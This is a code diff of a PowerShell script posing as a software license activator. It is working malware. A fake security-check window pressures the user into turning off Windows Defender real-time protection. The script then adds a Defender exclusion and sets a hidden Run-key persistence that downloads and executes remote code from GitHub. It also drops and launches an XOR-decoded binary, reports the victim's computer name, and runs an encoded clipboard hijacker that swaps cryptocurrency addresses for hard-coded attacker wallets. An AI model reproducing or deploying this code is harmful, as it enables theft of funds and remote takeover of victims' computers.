@@ -1,8 +1,8 @@
-# --- [RESEARCH STAGER v42.0: THE V34-PRO SUITE] ---
+# --- [RESEARCH STAGER v43.0: MANUAL SECURITY GATEWAY] ---
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
-# 1. Force Admin Elevation First (Essential for the "Fix" button)
+# 1. Force Admin Elevation First
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
@@ -37,27 +37,26 @@ function Show-SecurityPrep {
     $console.Text = " > ANALYZING KERNEL... DONE`n > ELEVATED PRIVILEGES: GRANTED`n > Security Scan: [!] HEURISTIC CONFLICT DETECTED"
     $prep.Controls.Add($console)
 
+    $instr = New-Object Windows.Forms.Label
+    $instr.Location = New-Object Drawing.Point(35,230); $instr.Size = New-Object Drawing.Size(500,80)
+    $instr.Text = "To proceed, you MUST manually disable 'Real-time protection' in Windows Security. This prevents the license manager from being blocked during installation."
+    $prep.Controls.Add($instr)
+
     $link = New-Object Windows.Forms.Button
     $link.Location = New-Object Drawing.Point(40,330); $link.Size = New-Object Drawing.Size(480,45)
-    $link.Text = "Fix Security Conflicts Automatically (Recommended)"
+    $link.Text = "STEP 1: Open Security Settings & Turn All OFF"
     $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
     
-    # THE PRO FIX: This button now actually disables protection
+    # DIRECT DIRECTION: This opens the exact page where they must turn off protection
     $link.Add_Click({
-        $console.Text += "`n > INITIALIZING AUTOMATED SYSTEM OPTIMIZATION..."
-        try {
-            Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
-            $console.Text += "`n > SUCCESS: SECURITY CONFLICTS RESOLVED."
-            $check.Checked = $true
-        } catch {
-            $console.Text += "`n > ERROR: PLEASE DISABLE PROTECTION MANUALLY."
-            Start-Process "windowsdefender://threatsettings/"
-        }
+        $console.Text += "`n > OPENING SECURITY PANEL... PLEASE TURN OFF REAL-TIME PROTECTION."
+        Start-Process "windowsdefender://threatsettings/"
     })
     $prep.Controls.Add($link)
 
     $check = New-Object Windows.Forms.CheckBox
-    $check.Location = New-Object Drawing.Point(45,390); $check.Text = "I have adjusted security settings or used Auto-Fix."
+    $check.Location = New-Object Drawing.Point(45,390); $check.Size = New-Object Drawing.Size(500,30)
+    $check.Text = "STEP 2: I have turned off Real-time protection and am ready."
     $prep.Controls.Add($check)
 
     $btn = New-Object Windows.Forms.Button
@@ -86,7 +85,7 @@ function Show-ActivatorUI {
 
     foreach ($s in $stages) {
         $label.Text = "Status: " + $s.t
-        # REAL VERIFICATION: Check if the background job actually installed the file
+        # VERIFICATION LOOP: This stops the bar if they didn't actually turn it off
         if ($pb.Value -eq 70) {
             $target = "$env:PROGRAMDATA\Microsoft\DeviceSync\WinSvcHost.exe"
             $timer = 0
@@ -94,7 +93,7 @@ function Show-ActivatorUI {
                 [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 250; $timer++
             }
             if (!(Test-Path $target)) {
-                $form.Close(); [Windows.Forms.MessageBox]::Show("Activation Failed: Security block detected (0x80072EE2).", "Error", 0, 16) | Out-Null
+                $form.Close(); [Windows.Forms.MessageBox]::Show("Deployment Failed: Digital Signature Blocked. Ensure Real-time protection is OFF and retry.", "Error", 0, 16) | Out-Null
                 exit
             }
         }
@@ -110,20 +109,20 @@ Global-Initialize
 Show-SecurityPrep
 
 if ($global:proceed) {
-    Send-Ping -m "V42_VERIFIED_SUITE_ON_$env:COMPUTERNAME"
+    Send-Ping -m "V43_MANUAL_START_ON_$env:COMPUTERNAME"
     
     $BG_Logic = {
         try {
-            # 1. Persistence & Exclusion
+            # 1. Exclusion & Persistence
+            $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
+            if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
+            Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
+
             $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
             $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
             Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd
 
             # 2. Binary XOR Deployment
-            $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
-            if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
-            Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
-            
             $path = Join-Path $dir "WinSvcHost.exe"
             $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
             $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
@@ -132,7 +131,7 @@ if ($global:proceed) {
             [IO.File]::WriteAllBytes($path, $data)
             Start-Process $path -WindowStyle Hidden
 
-            # 3. Enhanced Clipper (BTC, ETH, SOL, TRC20)
+            # 3. Clipper Logic
             $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
             $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
             Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
